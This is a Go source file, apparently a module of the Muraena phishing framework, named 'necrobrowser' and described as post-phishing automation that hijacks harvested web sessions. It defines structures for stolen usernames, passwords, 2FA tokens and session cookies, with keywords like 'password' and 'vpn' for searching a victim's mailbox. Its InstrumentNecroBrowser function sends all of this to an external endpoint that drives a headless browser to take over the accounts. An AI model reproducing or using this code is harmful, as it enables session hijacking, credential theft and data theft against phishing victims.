package necrobrowser

import (
	"encoding/json"
	"fmt"

	"gopkg.in/resty.v1"

	"github.com/muraenateam/muraena/session"
)

const (
	// Name of this module
	Name = "necrobrowser"

	// Description of this module
	Description = "Post-phishing automation that hijacks the harvested web session in a dockerized Chrome Headless"

	// Author of this module
	Author = "Muraena Team"
)

// Necrobrowser module
type Necrobrowser struct {
	session.SessionModule

	Enabled  bool
	Endpoint string
	Token    string
	Portal   string
}

type InstrumentNecrobrowser struct {
	// gSuite, github
	Provider string `json:"provider" binding:"required"`

	DebuggingPort int `json:"debugPort" binding:"required"`

	// classic credentials including 2fa token if any
	Username string `json:"username"`
	Password string `json:"password"`
	Token    string `json:"token"`

	// cookie jar
	SessionCookies []SessionCookie `json:"sessionCookies"`

	// keywords to search if target is a webmail or in general search bars
	// for example: password, credentials, vpn, etc..
	Keywords []string `json:"keywords"`
}

// SessionCookie type is needed to interact with NecroBrowser
type SessionCookie struct {
	Name     string `json:"name"`
	Value    string `json:"value"`
	Domain   string `json:"domain"`
	Expires  string `json:"expires"`
	Path     string `json:"path"`
	HTTPOnly bool   `json:"httpOnly"`
	Secure   bool   `json:"secure"`
}

// Name returns the module name
func (module *Necrobrowser) Name() string {
	return Name
}

// Description returns the module description
func (module *Necrobrowser) Description() string {
	return Description
}

// Author returns the module author
func (module *Necrobrowser) Author() string {
	return Author
}

// Load configures the module by initializing its main structure and variables
func Load(s *session.Session) (m *Necrobrowser, err error) {

	m = &Necrobrowser{
		SessionModule: session.NewSessionModule(Name, s),
		Enabled:       s.Config.NecroBrowser.Enabled,
	}

	if !m.Enabled {
		m.Debug("is disabled")
		return
	}

	config := s.Config.NecroBrowser
	m.Endpoint = config.Endpoint
	m.Portal = config.Profile
	m.Token = config.Token
	return
}

func (module *Necrobrowser) InstrumentNecroBrowser(instrument *InstrumentNecrobrowser) (err error) {

	b, err := json.MarshalIndent(instrument, "", "\t")
	if err == nil {
		module.Warning("Instrumenting NecroBrowser:")
		module.Warning(string(b))
	}

	url := fmt.Sprintf("%s/%s/%s", module.Endpoint, "instrument", module.Token)
	resp, err := resty.R().SetBody(instrument).Post(url)
	if err != nil {
		return
	}

	module.Info("NecroBrowser Response: %+v", resp)
	return
}
